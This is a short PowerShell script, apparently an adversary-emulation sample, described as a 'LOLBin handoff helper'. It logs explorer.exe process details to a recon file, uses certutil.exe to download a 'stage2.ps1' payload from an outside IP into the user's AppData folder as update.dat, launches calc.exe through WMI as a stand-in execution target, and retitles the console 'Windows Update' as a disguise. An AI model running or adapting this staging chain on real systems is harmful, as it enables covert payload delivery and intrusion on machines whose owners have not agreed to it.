
<#
.SYNOPSIS
    WMI inventory and LOLBin handoff helper.

.DESCRIPTION
    Collects a short process inventory, downloads a payload stage
    payload through a signed Windows utility and starts a benign
    execution target.

.EXAMPLE
    PS> .\payload.ps1
#>
$EndpointUrl = 'https://198.51.100.20/stage2.ps1'
$PayloadPath = "$env:APPDATA\update.dat"
$TimeoutSec = 39
$ErrorActionPreference = "Continue"

Write-Verbose "Collecting process inventory"
Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "C:\ProgramData\recon.log" -Append
certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
$ResultObject = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
Write-Verbose ("Process ID: " + $ResultObject.ProcessId)

$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Output "stage 5 initialized"
